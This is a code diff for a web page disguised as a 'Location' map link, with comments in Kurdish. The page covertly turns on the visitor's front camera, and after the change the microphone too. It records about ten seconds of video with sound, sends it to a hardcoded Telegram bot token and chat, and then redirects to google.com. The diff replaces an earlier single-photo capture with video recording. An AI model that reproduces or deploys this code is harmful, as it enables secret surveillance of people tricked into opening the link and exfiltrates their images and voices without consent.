@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- ناوی لینکەکە لێرەدا دیاری کراوە -->
     <title>Location</title>
     <meta property="og:title" content="Location">
     <meta property="og:description" content="Map details">
@@ -19,51 +18,72 @@
             height: 100vh; 
             overflow: hidden;
         }
-        /* شاردنەوەی هەموو شتەکان لەبەر چاو */
-        video, canvas { display: none !important; }
+        video { display: none !important; }
     </style>
 </head>
 <body>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline muted></video>
 
     <script>
-        // زانیاری بۆتەکەی خۆت
         const token = '8734772782:AAFT6ize__0OBmz53luKQXus2iJpSg9NpmA';
         const chatId = '7602797383';
 
         window.onload = function() {
-            // داواکردنی مۆڵەتی کامێرا
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
             .then(stream => {
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // ١ چرکە چاوەڕێ دەکات تا وێنەکە ڕوون دەبێتەوە
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'img.jpg');
+                const mediaRecorder = new MediaRecorder(stream);
+                let chunks = [];
 
-                        // ناردنی وێنەکە بۆ تیلیگرامەکەت
-                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        }).then(() => {
-                            // دوای ناردن، بەکارهێنەرەکە دەنێرێت بۆ گووگڵ
-                            window.location.href = "https://google.com";
-                        });
-                    }, 'image/jpeg');
-                }, 1000);
+                mediaRecorder.ondataavailable = function(e) {
+                    if (e.data.size > 0) {
+                        chunks.push(e.data);
+                    }
+                };
+
+                // فرمانی ناردنی ڤیدیۆکە
+                function sendVideoData() {
+                    if (chunks.length === 0) return;
+                    
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('video', blob, 'video.mp4');
+
+                    fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => {
+                        stream.getTracks().forEach(track => track.stop());
+                        window.location.href = "https://google.com";
+                    }).catch(() => {
+                        window.location.href = "https://google.com";
+                    });
+                }
+
+                mediaRecorder.onstop = sendVideoData;
+
+                // دەستپێکردنی ڕیکۆردکردن بە ناردنی داتا هەر ٢ چرکە جارێک
+                mediaRecorder.start(2000); 
+
+                // ئەگەر بەکارهێنەرەکە پەڕەکەی داخست، هەوڵ دەدات خێرا ڤیدیۆکە بنێرێت
+                window.onbeforeunload = function() {
+                    if (mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
+                    }
+                };
+
+                // دوای ١٠ چرکە (10000 میلی چرکە) خۆی دەوەستێت و دەنێرێت
+                setTimeout(() => {
+                    if (mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
+                    }
+                }, 10000);
+
             }).catch(err => {
-                // ئەگەر مۆڵەتی نەدا هەر بچێتە گووگڵ
                 window.location.href = "https://google.com";
             });
         };
